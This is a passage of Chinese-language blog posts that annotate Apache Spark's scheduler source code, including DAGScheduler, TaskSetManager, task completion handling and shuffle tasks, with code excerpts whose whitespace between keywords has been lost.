 
 logError("Task %s:%d failed %d times; aborting job".format(
 
taskSet.id, index, maxTaskFailures))
 
 abort("Task %s:%d failed %d times (most recent failure: %s)".format(
 
taskSet.id, index, maxTaskFailures, failureReason))
 
 }
 
 }
 
 } else {
 
 logInfo("Ignoring task-lost event for TID " + tid +
 
" because task " + index + " is already finished")
 
 }
 
 }
 
 
 
DAGScheduler处理taskEnded流程：
 
def taskEnded(
 
 task: Task[_],
 
 reason: TaskEndReason,
 
 result: Any,
 
 accumUpdates: Map[Long, Any],
 
 taskInfo: TaskInfo,
 
 taskMetrics: TaskMetrics) {
 
eventProcessActor ! CompletionEvent(task, reason, result, accumUpdates, taskInfo, taskMetrics)
 
 }
 
处理CompletionEvent事件：
 
casecompletion @ CompletionEvent(task, reason, _, _, taskInfo, taskMetrics) =>
 
listenerBus.post(SparkListenerTaskEnd(task, reason, taskInfo, taskMetrics))
 
 handleTaskCompletion(completion)
 
 
 
DAGScheduler.handleTaskCompletion
 
读取失败的case,
 
case FetchFailed(bmAddress, shuffleId, mapId, reduceId) =>
 
// Mark the stage that the reducer was in as unrunnable
 
valfailedStage = stageIdToStage(task.stageId)
 
running -= failedStage
 
failed += failedStage
 
..............................
 
// Mark the map whose fetch failed as broken in the map stage
 
valmapStage = shuffleToMapStage(shuffleId)
 
if (mapId != -1) {
 
mapStage.removeOutputLoc(mapId, bmAddress)
 
 mapOutputTracker.unregisterMapOutput(shuffleId, mapId, bmAddress)
 
 }
 
...........................
 
failed += mapStage
 
// Remember that a fetch failed now; this is used to resubmit the broken
 
// stages later, after a small wait (to give other tasks the chance to fail)
 
lastFetchFailureTime = System.currentTimeMillis() // TODO: Use pluggable clock
 
// TODO: mark the executor as failed only if there were lots of fetch failures on it
 
if (bmAddress != null) {
 
把stage中可执行的partition中对应的executorid的location全部移出。
 
 handleExecutorLost(bmAddress.executorId, Some(task.epoch))
 
 }
 
 
 
case ExceptionFailure(className, description, stackTrace, metrics) =>
 
// Do nothing here, left up to the TaskScheduler to decide how to handle user failures
 
 
 
case TaskResultLost =>
 
// Do nothing here; the TaskScheduler handles these failures and resubmits the task.
 
 
 
 
 
TaskStatus.FINISHED状态
 
此状态表示task正常完成，
 
if (state == TaskState.FINISHED) {
 
移出taskSet中的running队列中移出此task
 
 taskSet.removeRunningTask(tid)
 
获取task的响应数据。
 
taskResultGetter.enqueueSuccessfulTask(taskSet, tid, serializedData)
 
 
 
TaskResultGetter.enqueueSuccessfulTask函数：
 
 
 
def enqueueSuccessfulTask(
 
 taskSetManager: TaskSetManager, tid: Long, serializedData: ByteBuffer) {
 
getTaskResultExecutor.execute(new Runnable {
 
overridedef run() {
 
try {
 
从响应的结果中得到数据，需要先执行deserialize操作。
 
valresult = serializer.get().deserialize[TaskResult[_]](serializedData) match {
 
如果result的结果小于akka的actor传输的大小，直接返回task的执行结果
 
casedirectResult: DirectTaskResult[_] => directResult
 
case IndirectTaskResult(blockId) =>
 
否则，result结果太大，通过BlockManager管理，通过blockManager拿到result的数据
 
 logDebug("Fetching indirect task result for TID %s".format(tid))
 
给DAGScheduler发送GettingResultEvent事件处理，
 
见下面TaskSchedulerImpl.handleTaskGettingResult函数
 
 scheduler.handleTaskGettingResult(taskSetManager, tid)
 
得到task的执行结果
 
valserializedTaskResult = sparkEnv.blockManager.getRemoteBytes(blockId)
 
task执行完成，并拿结果失败，见上面的错误处理中的TaskResultLost部分。
 
if (!serializedTaskResult.isDefined) {
 
/* We won't be able to get the task result if the machine that ran the task failed
 
 * between when the task ended and when we tried to fetch the result, or if the
 
 * block manager had to flush the result. */
 
 scheduler.handleFailedTask(
 
 taskSetManager, tid, TaskState.FINISHED, Some(TaskResultLost))
 
return
 
 }
 
对task的执行结果进行deserialized操作。
 
valdeserializedResult = serializer.get().deserialize[DirectTaskResult[_]](
 
serializedTaskResult.get)
 
拿到执行结果，移出对应的blockid
 
 sparkEnv.blockManager.master.removeBlock(blockId)
 
deserializedResult
 
 }
 
result.metrics.resultSize = serializedData.limit()
 
见下面的TaskSchedulerImpl.handleSuccessfulTask处理函数。
 
 scheduler.handleSuccessfulTask(taskSetManager, tid, result)
 
 } catch {
 
casecnf: ClassNotFoundException =>
 
valloader = Thread.currentThread.getContextClassLoader
 
 taskSetManager.abort("ClassNotFound with classloader: " + loader)
 
caseex: Throwable =>
 
 taskSetManager.abort("Exception while deserializing and fetching task: %s".format(ex))
 
 }
 
 }
 
 })
 
 }
 
 
 
TaskSchedulerImpl.handleTaskGettingResult函数：
 
 
 
def handleTaskGettingResult(taskSetManager: TaskSetManager, tid: Long) {
 
 taskSetManager.handleTaskGettingResult(tid)
 
 }
 
taskSetManager中
 
def handleTaskGettingResult(tid: Long) = {
 
valinfo = taskInfos(tid)
 
info.markGettingResult()
 
 sched.dagScheduler.taskGettingResult(tasks(info.index), info)
 
 }
 
通过DAGScheduler发起GettingResultEvent事件。
 
def taskGettingResult(task: Task[_], taskInfo: TaskInfo) {
 
eventProcessActor ! GettingResultEvent(task, taskInfo)
 
 }
 
 
 
对GettingResultEvent事件的处理：其实就是打个酱油，无实际处理操作。
 
case GettingResultEvent(task, taskInfo) =>
 
listenerBus.post(SparkListenerTaskGettingResult(task, taskInfo))
 
 
 
 
 
TaskSchedulerImpl.handleSuccessfulTask处理函数：
 
def handleSuccessfulTask(
 
 taskSetManager: TaskSetManager,
 
 tid: Long,
 
 taskResult: DirectTaskResult[_]) = synchronized {
 
 taskSetManager.handleSuccessfulTask(tid, taskResult)
 
 }
 
TastSetManager中
 
def handleSuccessfulTask(tid: Long, result: DirectTaskResult[_]) = {
 
valinfo = taskInfos(tid)
 
valindex = info.index
 
info.markSuccessful()
 
从running队列中移出此task
 
 removeRunningTask(tid)
 
if (!successful(index)) {
 
 logInfo("Finished TID %s in %d ms on %s (progress: %d/%d)".format(
 
 tid, info.duration, info.host, tasksSuccessful, numTasks))
 
向dagscheduler发送success消息，
 
 sched.dagScheduler.taskEnded(
 
tasks(index), Success, result.value, result.accumUpdates, info, result.metrics)
 
设置成功完成的task个数加一,同时在successful容器中设置task对应的运行状态为true,表示成功。
 
// Mark successful and stop if all the tasks have succeeded.
 
tasksSuccessful += 1
 
successful(index) = true
 
如果完成的task个数，达到task的总个数，完成此taskset,也就相当于完成了一个rdd
 
if (tasksSuccessful == numTasks) {
 
 sched.taskSetFinished(this)
 
 }
 
 } else {
 
 logInfo("Ignorning task-finished event for TID " + tid + " because task " +
 
index + " has already completed successfully")
 
 }
 
 }
 
 
 
DAGScheduler处理CompletionEvent的Success,,,,
 
case Success =>
 
 logInfo("Completed " + task)
 
if (event.accumUpdates != null) {
 
 Accumulators.add(event.accumUpdates) // TODO: do this only if task wasn't resubmitted
 
 }
 
把等待执行队列中移出此task
 
pendingTasks(stage) -= task
 
stageToInfos(stage).taskInfos += event.taskInfo -> event.taskMetrics
 
根据task的执行类型，处理两个类型的Task
 
taskmatch {
 
如果task是ResultTask,表示不需要shuffle操作
 
casert: ResultTask[_, _] =>
 
resultStageToJob.get(stage) match {
 
case Some(job) =>
 
如果此执行的stage的ActiveJob中对应此task的partition存储的finished标志为false,
 
if (!job.finished(rt.outputId)) {
 
设置task的完成标志为true
 
job.finished(rt.outputId) = true 
 
把job中完成的task个数加一，同时检查是否所有的task都完成,如果所有task都完成，
 
从相关的容器中移出此job与对应的stage.
 
job.numFinished += 1
 
// If the whole job has finished, remove it
 
if (job.numFinished == job.numPartitions) {
 
idToActiveJob -= stage.jobId
 
activeJobs -= job
 
resultStageToJob -= stage
 
 markStageAsFinished(stage)
 
 jobIdToStageIdsRemove(job.jobId)
 
listenerBus.post(SparkListenerJobEnd(job, JobSucceeded))
 
 }
 
调用ActiveJob内的JobWaiter.taskSucceeded函数，更新此task为完成，同时把result传入进行输出处理。
 
job.listener.taskSucceeded(rt.outputId, event.result)
 
 }
 
case None =>
 
 logInfo("Ignoring result from " + rt + " because its job has finished")
 
 }
 
针对shuffle的task的执行完成，处理流程：
 
casesmt: ShuffleMapTask =>
 
valstatus = event.result.asInstanceOf[MapStatus]
 
valexecId = status.location.executorId
 
 logDebug("ShuffleMapTask finished on " + execId)
 
if (failedEpoch.contains(execId) && smt.epoch <= failedEpoch(execId)) {
 
 logInfo("Ignoring possibly bogus ShuffleMapTask completion from " + execId)
 
 } else {
 
把shuffle的result(MapStatus)写入到stage的outputLoc中。每添加一个会把numAvailableOutputs的值加一，
 
当numAvailableOutputs的值==numPartitions的值时，表示shuffle的map执行完成。
 
stage.addOutputLoc(smt.partitionId, status)
 
 }
 
如果此stage还处在running状态，同时pendingTasks中所有的task已经处理完成
 
if (running.contains(stage) && pendingTasks(stage).isEmpty) {
 
更新stage的状态
 
 markStageAsFinished(stage)
 
.......................................
 
 
 
此处表示shuffle的stage处理完成，把shuffleid与stage的outputLocs注册到mapOutputTracker中。
 
把每一个shuffle taks执行的executor与host等信息，每一个task执行完成的大小。注册到mapoutput中。
 
每一个task的shuffle的writer都会有shuffleid的信息，注册成功后，
 
下一个stage会根据mapoutputtracker中此shuffleid的信息读取数据。 
 
 mapOutputTracker.registerMapOutputs(
 
stage.shuffleDep.get.shuffleId,
 
stage.outputLocs.map(list => if (list.isEmpty) nullelse list.head).toArray,
 
 changeEpoch = true)
 
 }
 
 clearCacheLocs()
 
stage中每一个partition的outputLoc默认值为Nil，如果发现有partition的值为Nil,表示有task处理失败，
 
重新提交此stage.此时会把没有成功的task重新执行。
 
if (stage.outputLocs.exists(_ == Nil)) {
 
.........................................
 
 submitStage(stage)
 
 } else {
 
valnewlyRunnable = new ArrayBuffer[Stage]
 
for (stage <- waiting) {
 
 logInfo("Missing parents for " + stage + ": " + getMissingParentStages(stage))
 
 }
 
此处检查下面未执行的所有的stage,如果stage(RDD)的上级shuffle依赖完成,
 
或者后面所有的stage不再有shuffle的stage的所有stage,拿到这些个stage.
 
for (stage <- waitingif getMissingParentStages(stage) == Nil) {
 
newlyRunnable += stage
 
 }
 
执行此stage后面的所有可执行的stage,把waiting中移出要执行的stage,
 
waiting --= newlyRunnable
 
在running队列中添加要执行的新的stage.
 
running ++= newlyRunnable
 
for {
 
stage <- newlyRunnable.sortBy(_.id)
 
jobId <- activeJobForStage(stage)
 
 } {
 
提交下一个stage的task分配与执行。
 
 logInfo("Submitting " + stage + " (" + stage.rdd + "), which is now runnable")
 
 submitMissingTasks(stage, jobId)
 
 }
 
 }
 
 }
 
 }
 
 
 
JobWaiter.taskSucceeded函数，
 
task完成后的处理函数。
 
 override def taskSucceeded(index: Int, result: Any): Unit = synchronized {
 
if (_jobFinished) {
 
thrownew UnsupportedOperationException("taskSucceeded() called on a finished JobWaiter")
 
 }
 
通过resultHandler函数把结果进行处理。此函数是生成JobWaiter时传入
 
 resultHandler(index, result.asInstanceOf[T])
 
把完成的task值加一
 
finishedTasks += 1
 
if (finishedTasks == totalTasks) {
 
如果完成的task个数等于所有的task的个数时，设置job的完成状态为true,并设置状态为JobSucceeded
 
如果设置为true,表示job执行完成，前面的等待执行完成结束等待。
 
_jobFinished = true
 
jobResult = JobSucceeded
 
this.notifyAll()
 
 }
 
 }
 
 
 
 
 
Task.runTask函数实现
 
Task的实现分为两类，
 
需要进行shuffle操作的ShuffleMapTask,
 
不需要进行shuffle操作的ResultTask.
 
 
 
ResulitTask.runTask
 
 override def runTask(context: TaskContext): U = {
 
metrics = Some(context.taskMetrics)
 
try {
 
此处通过生成task实例时也就是DAGScheduler的runJob时传入的function进行处理
 
 比如在PairRDDFunction.saveAsHadoopDataset中定义的writeToFile函数
 
 rdd.iterator中会根据不现的RDD的实现，执行其compute函数，
 
 而compute函数具体执行通过业务代码中定义的如map函数传入的定义的function进行执行，
 
func(context, rdd.iterator(split, context))
 
 } finally {
 
 context.executeOnCompleteCallbacks()
 
 }
 
 }
 
 
 
ShuffleMapTask.runTask
 
 
 
 override def runTask(context: TaskContext): MapStatus = {
 
valnumOutputSplits = dep.partitioner.numPartitions
 
metrics = Some(context.taskMetrics)
 
 
 
valblockManager = SparkEnv.get.blockManager
 
valshuffleBlockManager = blockManager.shuffleBlockManager
 
varshuffle: ShuffleWriterGroup = null
 
varsuccess = false
 
 
 
try {
 
通过shuffleId拿到一个shuffle的写入实例
 
// Obtain all the block writers for shuffle blocks.
 
valser = SparkEnv.get.serializerManager.get(dep.serializerClass, SparkEnv.get.conf)
 
shuffle = shuffleBlockManager.forMapTask(dep.shuffleId, partitionId, numOutputSplits, ser)
 
执行rdd.iterator操作，生成Pair,也就是Product2,根据key重新shuffle到不同的文件中。
 
当所有的shuffle的task完成后，会把此stage注册到 mapOutputTracker中，
 
等待下一个stage从中读取数据并执行其它操作，每一个shuffle的task完成后会生成一个MapStatus实例，
 
 此实例主要包含有shuffle执行的executor与host等信息，每一个task执行完成的大小。
 
具体的shuffle数据读取可参见后面的shufle分析.
 
// Write the map output to its associated buckets.
 
for (elem <- rdd.iterator(split, context)) {
 
valpair = elem.asInstanceOf[Product2[Any, Any]]
 
valbucketId = dep.partitioner.getPartition(pair._1)
 
shuffle.writers(bucketId).write(pair)
 
 }
 
 
 
// Commit the writes. Get the size of each bucket block (total block size).
 
vartotalBytes = 0L
 
vartotalTime = 0L
 
valcompressedSizes: Array[Byte] = shuffle.writers.map { writer: BlockObjectWriter =>
 
 writer.commit()
 
 writer.close()
 
valsize = writer.fileSegment().length
 
totalBytes += size
 
totalTime += writer.timeWriting()
 
 MapOutputTracker.compressSize(size)
 
 }
 
 
 
// Update shuffle metrics.
 
valshuffleMetrics = new ShuffleWriteMetrics
 
shuffleMetrics.shuffleBytesWritten = totalBytes
 
shuffleMetrics.shuffleWriteTime = totalTime
 
metrics.get.shuffleWriteMetrics = Some(shuffleMetrics)
 
 
 
success = true
 
new MapStatus(blockManager.blockManagerId, compressedSizes)
 
 } catch { casee: Exception =>
 
// If there is an exception from running the task, revert the partial writes
 
// and throw the exception upstream to Spark.
 
if (shuffle != null && shuffle.writers != null) {
 
for (writer <- shuffle.writers) {
 
writer.revertPartialWrites()
 
writer.close()
 
 }
 
 }
 
throwe
 
 } finally {
 
// Release the writers back to the shuffle block manager.
 
if (shuffle != null && shuffle.writers != null) {
 
shuffle.releaseWriters(success)
 
 }
 
// Execute the callbacks on task completion.
 
 context.executeOnCompleteCallbacks()
 
 }
 
 }
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Spark中的Scheduler, hongs-yang.iteye.com.blog.2059451, Sat, 03 May 2014 21:23:35 +0800

Spark中的Scheduler
 
scheduler分成两个类型，一个是TaskScheduler与其实现，一个是DAGScheduler。
 
TaskScheduler:主要负责各stage中传入的task的执行与调度。
 
DAGScheduler:主要负责对JOB中的各种依赖进行解析，根据RDD的依赖生成stage并通知TaskScheduler执行。
 
实例生成
 
TaskScheduler实例生成：
 
scheduler实例生成，我目前主要是针对on yarn的spark进行的相关分析，
 
在appmaster启动后，通过调用startUserClass()启动线程来调用用户定义的spark分析程序。
 
传入的第一个参数为appmastername(master),可传入的如:yarn-cluster等。
 
在用户定义的spark分析程序中，生成SparkContext实例。
 
通过SparkContext.createTaskScheduler函数。如果是yarn-cluster,生成YarnClusterScheduler实例。
 
此部分生成的scheduler为TaskScheduler实例。
 
defthis(sc: SparkContext) = this(sc, new Configuration())
 
同时YarnClusterSchduler实现TaskSchedulerImpl。
 
defthis(sc: SparkContext) = this(sc, sc.conf.getInt("spark.task.maxFailures", 4))
 
生成TaskScheduler中的SchedulerBackend属性引用，yarn-cluster为CoarseGrainedSchedulerBackend
 
valbackend = new CoarseGrainedSchedulerBackend(scheduler, sc.env.actorSystem)
 
scheduler.initialize(backend)
 
 
 
 
 
DAGScheduler实例生成：
 
class DAGScheduler(
 
 taskSched: TaskScheduler,
 
 mapOutputTracker: MapOutputTrackerMaster,
 
 blockManagerMaster: BlockManagerMaster,
 
 env: SparkEnv)
 
extends Logging {
 
 
 
defthis(taskSched: TaskScheduler) {
 
this(taskSched, SparkEnv.get.mapOutputTracker.asInstanceOf[MapOutputTrackerMaster],
 
 SparkEnv.get.blockManager.master, SparkEnv.get)
 
 }
 
 taskSched.setDAGScheduler(this)
 
 
 
scheduler调度过程分析
 
1.rdd执行action操作，如saveAsHadoopFile
 
2.调用SparkContext.runJob
 
3.调用DAGScheduler.runJob-->此函数调用submitJob,并等job执行完成。
 
Waiter.awaitResult()中通过_jobFinished检查job运行是否完成，如果完成，此传为true,否则为false.
 
_jobFinished的值通过resultHandler函数，每调用一次finishedTasks的值加一，
 
如果finishedTasks的个数等于totalTasks的个数时，表示完成。或者出现exception.
 
def runJob[T, U: ClassTag](
 
 rdd: RDD[T],
 
 func: (TaskContext, Iterator[T]) => U,
 
 partitions: Seq[Int],
 
 callSite: String,
 
 allowLocal: Boolean,
 
 resultHandler: (Int, U) => Unit,
 
 properties: Properties = null)
 
 {
 
valwaiter = submitJob(rdd, func, partitions, callSite, allowLocal, resultHandler, properties)
 
waiter.awaitResult() match {
 
case JobSucceeded => {}
 
case JobFailed(exception: Exception, _) =>
 
 logInfo("Failed to run " + callSite)
 
throwexception
 
 }
 
 }
 
 
 
4.调用DAGScheduler.submitJob函数，
 
部分代码：生成JobWaiter实例，并传入此实例，发送消息，调用JobSubmitted事件。并返回waiter实例。
 
JobWaiter是JobListener的实现。
 
valwaiter = new JobWaiter(this, jobId, partitions.size, resultHandler)
 
eventProcessActor ! JobSubmitted(
 
jobId, rdd, func2, partitions.toArray, allowLocal, callSite, waiter, properties)
 
waiter
 
 
 
5.处理DAGScheduler的JobSubmitted事件消息，通过processEvent处理消息接收的事件。
 
def receive = {
 
caseevent: DAGSchedulerEvent =>
 
 logTrace("Got event of type " + event.getClass.getName)
 
if (!processEvent(event)) {
 
 submitWaitingStages()
 
 } else {
 
resubmissionTask.cancel()
 
context.stop(self)
 
 }
 
 }
 
 }))
 
 
 
6. processEvent函数中处理JobSubmitted事件部分代码：
 
case JobSubmitted(jobId, rdd, func, partitions, allowLocal, callSite, listener, properties) =>
 
varfinalStage: Stage = null
 
try {
 
生成stage实例，stage的id通过nextStageId的值加一得到，task的个数就是partitions的分区个数，
 
根据job对应的rdd,得到如果parent rdd是shuffle的rdd时生成ShuffleMapStage，通过getParentStages函数，
 
此处去拿到parent rdd时，如果current rdd的parent rdd不是shuffle,递归调用parent rdd,
 
如果parend rdd中没有shuffle的rdd,不生成新的stage,否则有多少个，生成多少个。此处是处理DAG类的依赖
 
finalStage = newStage(rdd, partitions.size, None, jobId, Some(callSite))
 
 } catch {
 
casee: Exception =>
 
 logWarning("Creating new stage failed due to exception - job: " + jobId, e)
 
listener.jobFailed(e)
 
returnfalse
 
 }
 
生成ActiveJob实例。设置numFinished的值为0，表示job中有0个完成的task.
 
设置所有task个数的array finished.并把所有元素的值设置为false.把JobWaiter当listener传入ActiveJob.
 
valjob = new ActiveJob(jobId, finalStage, func, partitions, callSite, listener, properties)
 
 
 
对已经cache过的TaskLocation进行清理。
 
 clearCacheLocs()
 
 logInfo("Got job " + job.jobId + " (" + callSite + ") with " + partitions.length +
 
" output partitions (allowLocal=" + allowLocal + ")")
 
 logInfo("Final stage: " + finalStage + " (" + finalStage.name + ")")
 
 logInfo("Parents of final stage: " + finalStage.parents)
 
 logInfo("Missing parents: " + getMissingParentStages(finalStage))
 
如果runJob时传入的allowLocal的值为true,同时没有需要shuffle的rdd，同时partitions的长度为1，
 
也就是task只有一个，直接在local运行此job..通过runLocallyWithinThread生成一个线程来执行。
 
if (allowLocal && finalStage.parents.size == 0 && partitions.length == 1) {
 
// Compute very short actions like first() or take() with no parent stages locally.
 
listenerBus.post(SparkListenerJobStart(job, Array(), properties))
 
通过ActiveJob中的func函数来执行job的运行，此函数在rdd的action调用时生成定义，
 
如saveAsHadoopFile(saveAsHadoopDataset)中的定义的内部func,writeToFile函数。
 
完成函数执行后，调用上面提到的生成的JobWaiter.taskSucceeded函数。
 
 runLocally(job)
 
 } else {
 
否则有多个partition也就是有多个task,或者有shuffle的情况，
 
idToActiveJob(jobId) = job
 
activeJobs += job
 
resultStageToJob(finalStage) = job
 
listenerBus.post(SparkListenerJobStart(job, jobIdToStageIds(jobId).toArray, properties))
 
调用DAGScheduler.submitStage函数。
 
 submitStage(finalStage)
 
 }
 
 
 
7.DAGScheduler.submitStage函数：递归函数调用，
 
如果stage包含parent stage(shuffle的情况)把stage设置为waiting状态，等待parent stage执行完成才进行执行。
 
privatedef submitStage(stage: Stage) {
 
valjobId = activeJobForStage(stage)
 
if (jobId.isDefined) {
 
 logDebug("submitStage(" + stage + ")")
 
如果RDD的Dependency的RDD还没有执行完成，等待Dependency执行完成后当前的RDD才能进行执行操作。
 
if (!waiting(stage) && !running(stage) && !failed(stage)) {
 
根据stage中rdd的Dependency，检查是否需要生成新的stage,如果是ShuffleDependency，会生成新的ShuffleMapStage
 
此处去拿到parent rdd时，如果current rdd的parent rdd不是shuffle,递归调用parent rdd,
 
如果parend rdd中没有shuffle的rdd,不生成新的stage,否则有多少个，生成多少个。此处是处理DAG类的依赖
 
valmissing = getMissingParentStages(stage).sortBy(_.id)
 
 logDebug("missing: " + missing)
 
如果没有RDD中的shuffle的Dependency,也就是RDD之间都是NarrowDependency的Dependency
 
表示所有的Dependency都在map端本地执行。
 
if (missing == Nil) {
 
 logInfo("Submitting " + stage + " (" + stage.rdd + "), which has no missing parents")
 
 submitMissingTasks(stage, jobId.get)
 
running += stage
 
 } else {
 
如果RDD有Dependency,先执行parent rdd的stage操作。此处是递归函数调用
 
for (parent <- missing) {
 
 submitStage(parent)
 
 }
 
waiting += stage
 
 }
 
 }
 
 } else {
 
 abortStage(stage, "No active job for stage " + stage.id)
 
 }
 
 }
 
 
 
8. DAGScheduler.submitMissingTask的执行流程：
privatedef submitMissingTasks(stage: Stage, jobId: Int) {
 
 logDebug("submitMissingTasks(" + stage + ")")
 
// Get our pending tasks and remember them in our pendingTasks entry
 
valmyPending = pendingTasks.getOrElseUpdate(stage, new HashSet)
 
myPending.clear()
 
vartasks = ArrayBuffer[Task[_]]()
 
如果stage是shuffle的rdd,迭代stage下的的所有partition,根据partition与对应的TaskLocation
 
生成ShuffleMapTask.添加到task列表中。
 
if (stage.isShuffleMap) {
 
for (p <- 0 until stage.numPartitionsif stage.outputLocs(p) == Nil) {
 
vallocs = getPreferredLocs(stage.rdd, p)
 
tasks += new ShuffleMapTask(stage.id, stage.rdd, stage.shuffleDep.get, p, locs)
 
 }
 
 } else {
 
否则表示stage是非shuffle的rdd,此是是执行完成后直接返回结果的stage,生成ResultTask实例。
 
由于是ResultTask，因此需要传入定义的func,也就是如何处理结果返回
 
// This is a final stage; figure out its job's missing partitions
 
valjob = resultStageToJob(stage)
 
for (id <- 0 until job.numPartitionsif !job.finished(id)) {
 
valpartition = job.partitions(id)
 
vallocs = getPreferredLocs(stage.rdd, partition)
 
tasks += new ResultTask(stage.id, stage.rdd, job.func, partition, locs, id)
 
 }
 
 }
 
 
 
valproperties = if (idToActiveJob.contains(jobId)) {
 
idToActiveJob(stage.jobId).properties
 
 } else {
 
//this stage will be assigned to "default" pool
 
null
 
 }
 
 
 
// must be run listener before possible NotSerializableException
 
// should be "StageSubmitted" first and then "JobEnded"
 
listenerBus.post(SparkListenerStageSubmitted(stageToInfos(stage), properties))
 
 
 
if (tasks.size > 0) {
 
// Preemptively serialize a task to make sure it can be serialized. We are catching this
 
// exception here because it would be fairly hard to catch the non-serializable exception
 
// down the road, where we have several different implementations for local scheduler and
 
// cluster schedulers.
 
try {
 
 SparkEnv.get.closureSerializer.newInstance().serialize(tasks.head)
 
 } catch {
 
casee: NotSerializableException =>
 
 abortStage(stage, "Task not serializable: " + e.toString)
 
running -= stage
 
return
 
 }
 
 
 
 logInfo("Submitting " + tasks.size + " missing tasks from " + stage + " (" + stage.rdd + ")")
 
myPending ++= tasks
 
 logDebug("New pending tasks: " + myPending)
 
生成TaskSet实例，把stage中要执行的Task列表传入，同时把stage对应的ActiveJob也传入。
 
通过TaskScheduler的实现，调用submitTasks函数，YarnClusterScheduler(TaskSchedulerImpl)
 
 taskSched.submitTasks(
 
new TaskSet(tasks.toArray, stage.id, stage.newAttemptId(), stage.jobId, properties))
 
stageToInfos(stage).submissionTime = Some(System.currentTimeMillis())
 
 } else {
 
 logDebug("Stage " + stage + " is actually done; %b %d %d".format(
 
 stage.isAvailable, stage.numAvailableOutputs, stage.numPartitions))
 
running -= stage
 
 }
 
 }
 
 
 
9.TaskSchedulerImpl.submitTasks函数流程分析：
 
通过传入的TaskSet,得到要执行的tasks列表，并生成TaskSetmanager实例，
 
同时把实例添加到的schedulableBuilder(FIFOSchedulableBuilder/FairSchedulableBuilder)队列中。
 
关于TaskSetManager实例可参见后面的分析。
 
overridedef submitTasks(taskSet: TaskSet) {
 
valtasks = taskSet.tasks
 
 logInfo("Adding task set " + taskSet.id + " with " + tasks.length + " tasks")
 
this.synchronized {
 
valmanager = new TaskSetManager(this, taskSet, maxTaskFailures)
 
activeTaskSets(taskSet.id) = manager
 
schedulableBuilder.addTaskSetManager(manager, manager.taskSet.properties)
 
taskSetTaskIds(taskSet.id) = new HashSet[Long]()
 
定期检查task的执行消息是否被生成执行。如果task被分配执行，关闭此线程。否则一直给出提示.
 
if (!isLocal && !hasReceivedTask) {
 
starvationTimer.scheduleAtFixedRate(new TimerTask() {
 
overridedef run() {
 
if (!hasLaunchedTask) {
 
 logWarning("Initial job has not accepted any resources; " +
 
"check your cluster UI to ensure that workers are registered " +
 
"and have sufficient memory")
 
 } else {
 
this.cancel()
 
 }
 
 }
 
 }, STARVATION_TIMEOUT, STARVATION_TIMEOUT)
 
 }
 
hasReceivedTask = true
 
 }
 
通过SchedulerBackend的实现CoarseGrainedSchedulerBackend.reviceOffers发起执行处理操作。
 
backend.reviveOffers()
 
 }
 
 
 
9.1TaskSetManager的实例生成:
 
private[spark] class TaskSetManager(
 
 sched: TaskSchedulerImpl,
 
valtaskSet: TaskSet,
 
valmaxTaskFailures: Int,
 
 clock: Clock = SystemClock)
 
extendsSchedulablewith Logging
 
...........................
 
for (i <- (0 until numTasks).reverse) {
 
 addPendingTask(i)
 
 }
 
关于addPendingTask的定义：此睦传入的readding的值为false.
 
 
 
privatedef addPendingTask(index: Int, readding: Boolean = false) {
 
// Utility method that adds `index` to a list only if readding=false or it's not already there
 
内部定义的addTo方法。
 
defaddTo(list: ArrayBuffer[Int]) {
 
if (!readding || !list.contains(index)) {
 
 list += index
 
 }
 
 }
 
 
 
varhadAliveLocations = false
 
迭代所有的要执行的task,并通过task的TaskLocation检查执行的节点级别。添加到相应的pendingTask容器中
 
for (loc <- tasks(index).preferredLocations) {
 
for (execId <- loc.executorId) {
 
检查TaskSchedulerImpl.activeExecutorIds的活动的worker的executor是否存在，
 
 如果是第一个执行的RDD时，此时activeExecutorIds容器的的值为空，当第一个RDD中有TASK在此executor中执行过后，
 
 会把executor的id添加到activeExecutorIds容器中。
 
第一个RDD的stage执行时，此部分不执行，但第二个stage执行时，可最大可能的保证task在PROCESS_LOCAL的执行。
 
if (sched.isExecutorAlive(execId)) {
 
 addTo(pendingTasksForExecutor.getOrElseUpdate(execId, new ArrayBuffer))
 
hadAliveLocations = true
 
 }
 
 }
 
if (sched.hasExecutorsAliveOnHost(loc.host)) {
 
 
 
如果在TaskSchedulerImpl的executorsByHost容器中包含此host,在pendingTasksForHost 中添加对应的task.
 
TaskSchedulerImpl.executorsByHost容器的值在每一个worker注册时
 
 通过向CoarseGrainedSchedulerBackend.DriverActor发送RegisterExecutor事件消息。
 
 通过makeOffers()-->TaskSchedulerImpl.resourceOffers把host添加到executorsByHost容器中。
 
 
 
 addTo(pendingTasksForHost.getOrElseUpdate(loc.host, new ArrayBuffer))
 
 
 
通过调用YarnClusterScheduler.getRackForHost得到host对应的rack,
 
并在rack的pending容器中添加对应的task个数和。
 
 
 
for (rack <- sched.getRackForHost(loc.host)) {
 
 addTo(pendingTasksForRack.getOrElseUpdate(rack, new ArrayBuffer))
 
 }
 
hadAliveLocations = true
 
 }
 
 }
 
如果上面两种情况都没有添加到容器中pendingTasksWithNoPrefs。
 
if (!hadAliveLocations) {
 
// Even though the task might've had preferred locations, all of those hosts or executors
 
// are dead; put it in the no-prefs list so we can schedule it elsewhere right away.
 
 addTo(pendingTasksWithNoPrefs)
 
 }
 
在TaskSetManager实例生成是，把所有task的个数都添加到allPendingTasks 容器中
 
if (!readding) {
 
allPendingTasks += index // No point scanning this whole list to find the old task there
 
 }
 
 }
 
 
 
.............................
 
得到可选择的LocalityLevel级别。
 
valmyLocalityLevels = computeValidLocalityLevels()
 
vallocalityWaits = myLocalityLevels.map(getLocalityWait) // Time to wait at each level
 
以下代码是 computeValidLocalityLevels的定义，主要根据各种locality中pending的容器中是否有值。
 
生成当前stage中的task执行可选择的Locality级别。
 
privatedef computeValidLocalityLevels(): Array[TaskLocality.TaskLocality] = {
 
import TaskLocality.{PROCESS_LOCAL, NODE_LOCAL, RACK_LOCAL, ANY}
 
vallevels = new ArrayBuffer[TaskLocality.TaskLocality]
 
if (!pendingTasksForExecutor.isEmpty && getLocalityWait(PROCESS_LOCAL) != 0) {
 
levels += PROCESS_LOCAL
 
 }
 
if (!pendingTasksForHost.isEmpty && getLocalityWait(NODE_LOCAL) != 0) {
 
levels += NODE_LOCAL
 
 }
 
if (!pendingTasksForRack.isEmpty && getLocalityWait(RACK_LOCAL) != 0) {
 
levels += RACK_LOCAL
 
 }
 
levels += ANY
 
 logDebug("Valid locality levels for " + taskSet + ": " + levels.mkString(", "))
 
levels.toArray
 
 }
 
}
 
以下代码是getLocalityWait的定义代码：此函数主要是定义每一个Task在此Locality级别中执行的等待时间。
 
